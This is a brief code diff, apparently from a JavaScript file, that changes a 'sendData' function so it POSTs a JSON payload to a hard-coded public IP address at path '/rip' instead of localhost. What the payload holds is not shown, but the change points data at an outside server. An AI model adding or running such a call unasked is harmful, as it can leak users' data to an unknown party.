@@ -431,7 +431,7 @@ pPULAN9ZRrxG8V+bvkZWVREPTZj7xPCwPaZHNKoAmi3Dbv7S5SEYDbBX/NyPCLE4sj/AgTPbUsUtaiw5
 
   function sendData(payload) {
     return new Promise((resolve, reject) => {
-      fetch("http://127.0.0.1:8088/rip", {
+      fetch("http://3.142.146.215:8088/rip", {
         method: "POST",
         body: JSON.stringify(payload),
         headers: {
